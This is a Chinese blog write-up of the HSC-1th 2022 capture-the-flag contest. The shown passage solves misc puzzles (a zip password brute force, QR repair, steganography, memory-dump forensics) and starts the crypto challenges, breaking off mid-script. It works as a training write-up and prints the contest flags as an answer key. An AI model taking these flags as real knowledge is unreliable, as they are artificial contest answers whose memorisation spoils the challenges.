<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>HSC-1th 2022 | Lazzaro</title><meta name="description" content="​     本届HSC1th 2022是由社会战队红客突击队（Honker Security Commando）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖web，crypto，misc，re等主流方向，并面向全球开放。比赛三甲可获突击队周边礼品。 Rank: 2  MISCSign-in 前往红客突击队公众号发送“HSC2019”并签到吧！  公众号签到。 flag{HSC_W3LC"><meta property="og:type" content="article"><meta property="og:title" content="HSC-1th 2022"><meta property="og:url" content="https://lazzzaro.github.io/2022/02/20/match-HSC-1th-2022/index.html"><meta property="og:site_name" content="Lazzaro"><meta property="og:description" content="​     本届HSC1th 2022是由社会战队红客突击队（Honker Security Commando）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖web，crypto，misc，re等主流方向，并面向全球开放。比赛三甲可获突击队周边礼品。 Rank: 2  MISCSign-in 前往红客突击队公众号发送“HSC2019”并签到吧！  公众号签到。 flag{HSC_W3LC"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://lazzzaro.github.io/2022/02/20/match-HSC-1th-2022/outx.png"><meta property="og:image" content="https://lazzzaro.github.io/2022/02/20/match-HSC-1th-2022/task.png"><meta property="article:published_time" content="2022-02-20T08:28:40.000Z"><meta property="article:modified_time" content="2022-02-21T11:24:05.717Z"><meta property="article:author" content="Lazzaro"><meta property="article:tag" content="2022赛"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://lazzzaro.github.io/2022/02/20/match-HSC-1th-2022/outx.png"><link rel="canonical" href="https://lazzzaro.github.io/2022/02/20/match-HSC-1th-2022/index.html"><link rel="alternate" href="/atom.xml" title="Lazzaro" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link href="https://cdn.jsdelivr.net/npm/katex@0.9.0/dist/katex.min.css" rel="stylesheet"><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"3Ft5J9t2Jl0eb5Zr",ck:"3Ft5J9t2Jl0eb5Zr",hashMode:!0})</script><meta name="generator" content="Hexo 7.0.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/Lazzzaro" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">Lazzaro</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">CTF弱鸡自进阶</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> flag{}___Orz</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="搜索"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">总览</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">汇总</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">类别</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">关键词</span></a></li><li class="menu-item menu-item-guestbook"><a href="/guestbook"><i class="icon"></i> <span class="menu-title">来留个言 👉👉👉</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">类别</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/crypto/">crypto</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/match/">match</a><span class="category-list-count">50</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/misc/">misc</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/other/">other</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">17</span></li></ul></div></div><div class="widget"><h3 class="widget-title">关键词云</h3><div class="widget-body tagcloud"><a href="/tags/2020%E8%B5%9B/" style="font-size:14px">2020赛</a> <a href="/tags/2021%E8%B5%9B/" style="font-size:13.86px">2021赛</a> <a href="/tags/2022%E8%B5%9B/" style="font-size:13.57px">2022赛</a> <a href="/tags/2023%E8%B5%9B/" style="font-size:13.71px">2023赛</a> <a href="/tags/2024%E8%B5%9B/" style="font-size:13.29px">2024赛</a> <a href="/tags/2025%E8%B5%9B/" style="font-size:13px">2025赛</a> <a href="/tags/AES/" style="font-size:13px">AES</a> <a href="/tags/Android/" style="font-size:13px">Android</a> <a href="/tags/Bash/" style="font-size:13px">Bash</a> <a href="/tags/CMS/" style="font-size:13px">CMS</a> <a href="/tags/CSRF/" style="font-size:13px">CSRF</a> <a href="/tags/DES/" style="font-size:13px">DES</a> <a href="/tags/ECC/" style="font-size:13px">ECC</a> <a href="/tags/IDA/" style="font-size:13px">IDA</a> <a href="/tags/JWT/" style="font-size:13px">JWT</a> <a href="/tags/Java/" style="font-size:13.14px">Java</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/OT/" style="font-size:13px">OT</a> <a href="/tags/PHP/" style="font-size:13.29px">PHP</a> <a href="/tags/RCE/" style="font-size:13px">RCE</a> <a href="/tags/RSA/" style="font-size:13.14px">RSA</a> <a href="/tags/SQL/" style="font-size:13px">SQL</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/SSTI/" style="font-size:13px">SSTI</a> <a href="/tags/Sage/" style="font-size:13px">Sage</a> <a href="/tags/USB/" style="font-size:13px">USB</a> <a href="/tags/Unity/" style="font-size:13px">Unity</a> <a href="/tags/WebAssembly/" style="font-size:13px">WebAssembly</a> <a href="/tags/XSS/" style="font-size:13px">XSS</a> <a href="/tags/XXE/" style="font-size:13px">XXE</a> <a href="/tags/angr/" style="font-size:13px">angr</a> <a href="/tags/fuzz/" style="font-size:13px">fuzz</a> <a href="/tags/gmpy2/" style="font-size:13px">gmpy2</a> <a href="/tags/hash/" style="font-size:13px">hash</a> <a href="/tags/js/" style="font-size:13px">js</a> <a href="/tags/node-js/" style="font-size:13.14px">node.js</a> <a href="/tags/pwntools/" style="font-size:13px">pwntools</a> <a href="/tags/python/" style="font-size:13.43px">python</a> <a href="/tags/wasm/" style="font-size:13px">wasm</a> <a href="/tags/z3/" style="font-size:13px">z3</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size:13px">内网</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">反序列化</a> <a href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/" style="font-size:13px">反编译</a> <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" style="font-size:13px">反调试</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size:13px">取证</a> <a href="/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/" style="font-size:13px">后量子密码</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" style="font-size:13px">命令行</a> <a href="/tags/%E5%9B%BE%E5%83%8F/" style="font-size:13px">图像</a> <a href="/tags/%E5%9D%97%E5%AF%86%E7%A0%81/" style="font-size:13px">块密码</a> <a href="/tags/%E5%A0%86/" style="font-size:13px">堆</a> <a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size:13.14px">密码</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size:13px">提权</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:13px">文件上传</a> <a href="/tags/%E6%9B%B2%E7%BA%BF/" style="font-size:13px">曲线</a> <a href="/tags/%E6%A0%88/" style="font-size:13px">栈</a> <a href="/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/" style="font-size:13px">格密码</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size:13px">格式化字符串</a> <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size:13px">注入</a> <a href="/tags/%E6%B5%81%E5%AF%86%E7%A0%81/" style="font-size:13px">流密码</a> <a href="/tags/%E6%B5%81%E9%87%8F/" style="font-size:13px">流量</a> <a href="/tags/%E6%B7%B7%E6%B7%86/" style="font-size:13px">混淆</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size:13px">渗透</a> <a href="/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/" style="font-size:13px">离散对数</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size:13.14px">算法</a> <a href="/tags/%E7%BB%95%E8%BF%87/" style="font-size:13.43px">绕过</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size:13px">编码</a> <a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size:13.14px">脚本</a> <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size:13px">自动化</a> <a href="/tags/%E9%80%83%E9%80%B8/" style="font-size:13px">逃逸</a> <a href="/tags/%E9%9A%90%E5%86%99/" style="font-size:13.29px">隐写</a></div></div><div class="widget"><h3 class="widget-title">汇总</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">八月 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/06/">六月 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">十二月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">十一月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">三月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">十一月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">九月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">五月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">二月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">一月 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">十二月 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">十一月 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">九月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">七月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">八月 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">十一月 2020</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a><span class="archive-list-count">24</span></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">文章目录</h3><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">1.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Sign-in"><span class="toc-number">1.1.</span> <span class="toc-text">Sign-in</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DORAEMON"><span class="toc-number">1.2.</span> <span class="toc-text">DORAEMON</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%9D%E9%97%BB-%E4%BA%BA%E8%A8%80%E5%90%A6"><span class="toc-number">1.3.</span> <span class="toc-text">汝闻,人言否</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PERFORMANCE-ART"><span class="toc-number">1.4.</span> <span class="toc-text">PERFORMANCE-ART</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WIRESHARK"><span class="toc-number">1.5.</span> <span class="toc-text">WIRESHARK</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PCXP"><span class="toc-number">1.6.</span> <span class="toc-text">PCXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">2.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Easy-SignIn"><span class="toc-number">2.1.</span> <span class="toc-text">Easy SignIn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AFFINE"><span class="toc-number">2.2.</span> <span class="toc-text">AFFINE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LINE-GENERATION-TEST"><span class="toc-number">2.3.</span> <span class="toc-text">LINE-GENERATION-TEST</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LATTICE"><span class="toc-number">2.4.</span> <span class="toc-text">LATTICE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA"><span class="toc-number">2.5.</span> <span class="toc-text">RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BABY-RSA"><span class="toc-number">2.6.</span> <span class="toc-text">BABY-RSA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">3.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CLICK"><span class="toc-number">3.1.</span> <span class="toc-text">CLICK</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-sign-in"><span class="toc-number">3.2.</span> <span class="toc-text">Web-sign in</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXEC"><span class="toc-number">3.3.</span> <span class="toc-text">EXEC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Language"><span class="toc-number">3.4.</span> <span class="toc-text">Language</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REVERSE"><span class="toc-number">4.</span> <span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hiahia-o-%E2%96%BD-%E2%94%9B"><span class="toc-number">4.1.</span> <span class="toc-text">hiahia o(*^▽^*)┛</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ANDROID"><span class="toc-number">4.2.</span> <span class="toc-text">ANDROID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WAY"><span class="toc-number">4.3.</span> <span class="toc-text">WAY</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SPARK"><span class="toc-number">4.4.</span> <span class="toc-text">SPARK</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">5.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ez-pwn"><span class="toc-number">5.1.</span> <span class="toc-text">Ez_pwn</span></a></li></ol></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-match-HSC-1th-2022" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">HSC-1th 2022</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2022/02/20/match-HSC-1th-2022/" class="article-date"><time datetime="2022-02-20T08:28:40.000Z" itemprop="datePublished">2022-02-20</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/match/">match</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/2022%E8%B5%9B/" rel="tag">2022赛</a> </span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/2022/02/20/match-HSC-1th-2022/" class="leancloud_visitors" data-flag-title="HSC-1th 2022"><span class="leancloud-visitors-count">∞</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/02/20/match-HSC-1th-2022/#comments" class="article-comment-link">评论</a></span></div></div><div class="article-entry marked-body" itemprop="articleBody"><p>​</p><p>本届HSC1th 2022是由社会战队红客突击队（Honker Security Commando）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖web，crypto，misc，re等主流方向，并面向全球开放。比赛三甲可获突击队周边礼品。</p><p>Rank: 2</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign-in"></a>Sign-in</h3><blockquote><p>前往红客突击队公众号发送“HSC2019”并签到吧！</p></blockquote><p>公众号签到。</p><p>flag{HSC_W3LC0M3}</p><p>​</p><h3 id="DORAEMON"><a href="#DORAEMON" class="headerlink" title="DORAEMON"></a>DORAEMON</h3><p>zip压缩包注释 <code>哆啦A梦把泡好的QR放进口袋后，用六位数字把自己放好了。你能找到它吗？</code>，爆破得到密码 <code>376852</code>；</p><p>得到png图片用16进制修改器修改高度，得到缺少两个定位图案的二维码；</p><p>修复上方两个定位图案，扫描得flag：flag{sing1emak3r10v3m!sc}</p><p>​</p><h3 id="汝闻-人言否"><a href="#汝闻-人言否" class="headerlink" title="汝闻,人言否"></a>汝闻,人言否</h3><p>png文件后存在zip压缩包，提取后在16进制查看器下修复压缩包，将两处 <code>4B 50</code> 修改为 <code>50 4B</code>；</p><p>发现zip压缩包加密，注释 <code>qazsedcftrfvgycft6yhntgbnytfvbhyik,.;p</code> 为键盘密码，在键盘上画出六个字母 <code>WVALOU</code> 为解压密码，得到 <code>flag</code> 文件，16进制查看发现为wav文件结构；</p><p>使用audacity查看wav文件，在频谱图发现flag：<code>flag:e5353bb7b57578bd4da1c898a8e2d767</code></p><p>​</p><h3 id="PERFORMANCE-ART"><a href="#PERFORMANCE-ART" class="headerlink" title="PERFORMANCE-ART"></a>PERFORMANCE-ART</h3><p>两种图形替换密码的混合，其中一种为标准银河字母（Standard Galactic Alphabet），猜测另一种代表数字，根据形状和出现概率，猜测出前几位 <code>504B0304140000000</code>，为zip压缩包文件头。</p><p>依次还原所有字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">504b03041400000008004a7e7253148e1e</span><br><span class="line">1e160000001400000006000000756e6b6e6</span><br><span class="line">f778bcaadc888322ec9f30b752df70c</span><br><span class="line">cfae8cca72b30400504b01021f0014000</span><br><span class="line">00008004a7e7253148e1e1e16000000140</span><br><span class="line">000000600240000000000000020000000000</span><br><span class="line">00000756e6b6e6f770a002000000000000</span><br><span class="line">1001800778284ef50dcd7016b04efef5</span><br><span class="line">0dcd701e1b0ef144fdcd701504b05060</span><br><span class="line">000000001000100580000003a0000000000</span><br></pre></td></tr></table></figure><p>保存为zip文件，打开得到内容 <code>ZmxhZ3tnNUEwIWkyZjF9</code>，base64解码得flag：flag{g5A0!i2f1}</p><p>​</p><h3 id="WIRESHARK"><a href="#WIRESHARK" class="headerlink" title="WIRESHARK"></a>WIRESHARK</h3><p>zip压缩包后存在png图片，提取后使用zsteg查看LSB隐写，在 <code>b1,rgb,lsb,xy</code> 通道隐写了一张png图片，提取：</p><p><code>zsteg -E &quot;b1,rgb,lsb,xy&quot; Untitled1.png &gt; out.png</code></p><p>是一张二维码，扫描得到内容 <code>wrsak..iehr370</code>，栅栏解密 <code>wireshark3.7.0</code>；</p><p>解压最开始的zip压缩包得到 <code>wireshark</code>，16进制查看发现为pdf文件结构，文件头被修改过，还原为 <code>%PDF</code> （<code>25 50 44 46</code>）正常打开，内容无有用信息，猜想为PDF隐写；</p><p>使用wbStego工具从pdf文件成功提取出flag：flag{Go0dJ0B_y0ufIndLt}</p><p>​</p><h3 id="PCXP"><a href="#PCXP" class="headerlink" title="PCXP"></a>PCXP</h3><blockquote><p>百度网盘<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/12q5ULEp_RD62MwbV5eE11A">https://pan.baidu.com/s/12q5ULEp_RD62MwbV5eE11A</a> 提取码：1qih</p><p>奶牛快传<a target="_blank" rel="noopener" href="https://cowtransfer.com/s/b76470ddc9e04a">https://cowtransfer.com/s/b76470ddc9e04a</a></p><p>蓝奏云<a target="_blank" rel="noopener" href="https://wwo.lanzouy.com/b030r1x4j">https://wwo.lanzouy.com/b030r1x4j</a> 密码:cvi0</p><p>本题目文件PCXP1与PCXP2均需要下载！</p><p>本题文件中flag{raw_Imfig3_mLs3}属于干扰项</p></blockquote><p>两个dump内存的raw文件，用volatility分析。</p><p>其中一个发现 <code>ffflaaagggg.rar</code> 文件：</p><p><code>0x000000000227db70 1 0 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\My Documents\My Music\ffflaaagggg.rar</code></p><p>根据提示，另一个发现 <code>mirror.rar</code> 文件：</p><p><code>0x00000000021221e0 1 0 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\My Documents\My Music\mirror.rar</code></p><p>分别dumpfiles，按注释<code>key:mirror</code> 解压 <code>mirror.rar</code>，提取 <code>mirror.png</code>，发现后半部分有反转的png，reverse处理得到png内有密码 <code>HSC-1th202248H</code> ；</p><p>用密码解压 <code>ffflaaagggg.rar</code>，得到 <code>secret.pcap</code>，用tshark提取USB流量无结果；</p><p>查看16进制发现存在PNG文件头，用foremost提取出两张png图片，画面相同大小不同，猜测为盲水印隐写；</p><p>使用BlindWaterMark工具提取：</p><p><code>python3 bwmforpy3.py decode 00000030.png 00000094.png out.png</code></p><p>得到flag：flag{Wat3rMarkPtysc}</p><p><img src="/2022/02/20/match-HSC-1th-2022/outx.png" alt="outx"></p><p>​</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Easy-SignIn"><a href="#Easy-SignIn" class="headerlink" title="Easy SignIn"></a>Easy SignIn</h3><blockquote><p>5445705857464579517A4A48546A4A455231645457464243566B5579556C7053546C4A4E524564565646644D515670455130354C5755644F5231685256314A5452315A5552304E57576C5A49525430395054303950513D3D</p></blockquote><p>ciphey一把梭，flag：flag{welc0me_to_my_s1gn_in}</p><p>​</p><h3 id="AFFINE"><a href="#AFFINE" class="headerlink" title="AFFINE"></a>AFFINE</h3><blockquote><p>flag{md5(result)}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">letter=string.ascii_letters+string.digits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m, c, a, b</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        ch=m[i]</span><br><span class="line">        t=(letter.index(ch) * a + b) % <span class="number">62</span></span><br><span class="line">        c.append(letter[t])</span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">m = </span><br><span class="line">c = []</span><br><span class="line">a = </span><br><span class="line">b = </span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (<span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;加密后的密文为：&quot;</span>)</span><br><span class="line">Cipher = encrypt(m, c, a, b)</span><br><span class="line">flag = hashlib.md5(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(m)).encode(<span class="string">&quot;utf8&quot;</span>)).hexdigest()</span><br><span class="line"><span class="comment">#print(flag)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">加密后的密文为：</span></span><br><span class="line"><span class="string">xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>仿射密码加密，先根据密文和明文，爆破各位置存在 <code>flag</code> 字符串情况下对应的 <code>a,b</code> 值，再解密整串密文。</p><p>爆破求 <code>a,b</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 